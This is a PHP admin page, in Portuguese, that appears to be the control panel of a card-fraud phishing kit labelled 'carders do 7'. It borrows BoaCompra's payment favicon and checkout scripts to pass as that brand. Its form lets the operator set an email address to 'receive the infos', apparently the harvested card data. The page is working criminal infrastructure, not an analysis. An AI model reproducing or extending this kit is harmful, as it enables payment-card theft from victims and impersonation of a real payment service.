
<?php

error_reporting(0);

session_start();
if (!isset($_SESSION['user']) || !isset($_SESSION['pass'])) {
	setcookie('msg','<center>Voce deve logar-se primeiro',time()+1);
	header('Location: login.php');
}

if (@$_GET['action'] == 'sair') {
	session_destroy();
	header('Location: login.php');
}

?>

<html lang="en">
 <head> 
  <title>ADMIN</title> 
  <meta charset="UTF-8">
  <meta name="robots" content="noindex"> 
  <meta name="theme-color" content="black"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"> 
  <link rel="dns-prefetch" href="https://in.hotjar.com"> 
  <link rel="dns-prefetch" href="https://vars.hotjar.com"> 
  <link rel="dns-prefetch" href="https://script.hotjar.com"> 
  <link rel="dns-prefetch" href="https://static.hotjar.com"> 
  <link rel="dns-prefetch" href="https://me.jsuol.com.br"> 
  <link rel="dns-prefetch" href="https://api.boacompra.com"> 
  <link rel="dns-prefetch" href="//me.jsuol.com.br"> 
  <link rel="icon" href="https://payment.boacompra.com/statics//images/favicon.ico"> 
 
  <link rel="stylesheet" href="dataCollect/tokenized.css"> 
  <script async src="https://me.jsuol.com.br/aud/boacompracheckout.js"></script>
  <script async src="https://static.hotjar.com/c/hotjar-596441.js"></script>
  <script async src="https://script.hotjar.com/modules.24670e88b088e10656d2.js" charset="utf-8"></script>
 
<style> #tudo { background: url(teste.jpeg) no-repeat center center;background-size: 100%; } </style> 

<div class="tudo">
<style>
BODY {
background-color : black;
}


.btn {
padding: 10px 50px;
border-radius: 4px; 
text-align: center;
vertical-align: middle; 
}
.btn-info {
background-color: red;
border-color: red;
color: #fff;
}
.btn-info:hover, .btn-info:focus, .btn-info:acitive {
background-color: #31b0d5;
border-color: #269abc;
color: #fff;
}



</style>
 </head> 
 <body class="tudo"> 



<center>
<div> <table> <tr> <td> <div> <a class="button" href="index.php" style="float: right; border:1px solid; padding: 11px 21px; vertical-align: middle; background:red; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">INICIO</a> </div> </td> <td> <div> <a class="button" href="deslogar.php" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:red; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">DESLOGAR</a> <td> <div> <a class="button" href="usuarios.php" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:red; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">USUARIOS</a> </div> </td> </tr> </table> </div>
</div> </td> </tr> </table> </div>
 
</center>
</center>
<center>

<h1 style="color:red;">carders do 7 <h1>
    <div class="header__logo"> 
     <img src="images/logo.gif" style="width:100%" alt="CARDERSDO7" title="cardersdo7"> 
    
 

     <form id="form" action="add_email.php" method="POST" class="tokenized__form"> 
      
<div class="tokenized__wrapper tokenized__wrapper--form"> 
       
        
<div class="tokenized__fields"> 
        

         
          <div> 
           <input class="field-group__input" autocomplete="off" id="email" name="email"  placeholder="Digite seu email para receber as infos " type="email" required data-hj-masked=""> 
       
</div>

      
      
</div>
</div>
         
       <button type="submit" class="btn btn-info "> ATUALIZAR <n> </button> 
</form>

</center>
    
